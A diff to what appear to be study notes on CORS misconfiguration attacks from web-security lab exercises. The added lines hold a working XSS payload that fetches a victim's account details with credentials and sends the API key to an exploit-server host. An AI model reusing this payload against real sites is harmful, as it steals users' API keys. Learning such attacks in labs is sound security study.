@@ -61,9 +61,11 @@ location = 'https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/
 </script>"></iframe>
 ```
 4. Exploiting XSS via CORS trust relationships
-- Use XSS with the first CORS exploit, or fetch:
+- Use XSS with the first CORS exploit:
   ```html
-  <script>fetch()</script>
+  <script>
+    location="http://subdomain/?param=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a0f002004d241048007da1d006100c9.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {var res = JSON.parse(this.response); location='https://exploit-0a9c0056042b411d809bd96701ef00ae.exploit-server.net/accountDetails?key='%2bres.apikey;};</script>"
+  </script>
   ```
 5. Breaking TLS with poorly configured CORS
 - This attack involves the following steps:
